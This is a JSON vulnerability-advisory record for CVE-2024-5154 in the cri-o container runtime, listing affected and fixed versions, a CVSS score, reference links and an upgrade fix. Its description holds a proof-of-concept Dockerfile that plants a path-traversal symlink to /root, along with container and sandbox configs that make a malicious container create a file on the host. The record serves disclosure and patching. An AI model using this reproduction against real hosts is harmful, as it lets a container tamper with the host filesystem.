{
  "Identifier": "CVE-2024-5154",
  "PackageSlug": "go/github.com/cri-o/cri-o",
  "Title": "malicious container creates symlink \"mtab\" on the host External",
  "Description": "A malicious container can affect the host by taking advantage of code cri-o added to show the container mounts on the host.\n\nA workload built from this Dockerfile:\n```\nFROM docker.io/library/busybox as source\nRUN mkdir /extra \u0026\u0026 cd /extra \u0026\u0026 ln -s ../../../../../../../../root etc\n\nFROM scratch\n\nCOPY --from=source /bin /bin\nCOPY --from=source /lib /lib\nCOPY --from=source /extra .\n\n```\n\nand this container config:\n\n```\n{\n\"metadata\": {\n\"name\": \"busybox\"\n},\n\"image\":{\n\"image\": \"localhost/test\"\n},\n\"command\": [\n\"/bin/true\"\n],\n\"linux\": {\n}\n}\n\n\n```\nand this sandbox config\n```\n{\n\"metadata\": {\n\"name\": \"test-sandbox\",\n\"namespace\": \"default\",\n\"attempt\": 1,\n\"uid\": \"edishd83djaideaduwk28bcsb\"\n},\n\"linux\": {\n\"security_context\": {\n\"namespace_options\": {\n\"network\": 2\n}\n}\n}\n}\n\n```\n\nwill create a file on host `/host/mtab`",
  "Date": "2025-06-27",
  "Pubdate": "2024-06-04",
  "AffectedRange": "\u003e=1.28.6 \u003c1.28.7||\u003e=1.29.4 \u003c1.29.5||\u003e=1.30.0 \u003c1.30.1",
  "FixedVersions": [
    "1.28.7",
    "1.29.5",
    "1.30.1"
  ],
  "AffectedVersions": "All versions starting from 1.28.6 before 1.28.7, all versions starting from 1.29.4 before 1.29.5, all versions starting from 1.30.0 before 1.30.1",
  "NotImpacted": "All versions before 1.28.6, all versions starting from 1.28.7 before 1.29.4, all versions starting from 1.29.5 before 1.30.0, all versions starting from 1.30.1",
  "Solution": "Upgrade to versions 1.28.7, 1.29.5, 1.30.1 or above.",
  "Urls": [
    "https://nvd.nist.gov/vuln/detail/CVE-2024-5154",
    "https://github.com/advisories/GHSA-j9hf-98c3-wrm8",
    "https://github.com/cri-o/cri-o/security/advisories/GHSA-j9hf-98c3-wrm8",
    "https://access.redhat.com/errata/RHSA-2024:10818",
    "https://access.redhat.com/errata/RHSA-2024:3676",
    "https://access.redhat.com/errata/RHSA-2024:3700",
    "https://access.redhat.com/errata/RHSA-2024:4008",
    "https://access.redhat.com/errata/RHSA-2024:4159",
    "https://access.redhat.com/errata/RHSA-2024:4486",
    "https://access.redhat.com/security/cve/CVE-2024-5154",
    "https://bugzilla.redhat.com/show_bug.cgi?id=2280190",
    "https://github.com/cri-o/cri-o",
    "https://pkg.go.dev/vuln/GO-2024-2919"
  ],
  "CvssV2": "",
  "CvssV3": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:N",
  "UUID": "17bdbe5c-3d60-4011-bd0a-560e9c5d25c3"
}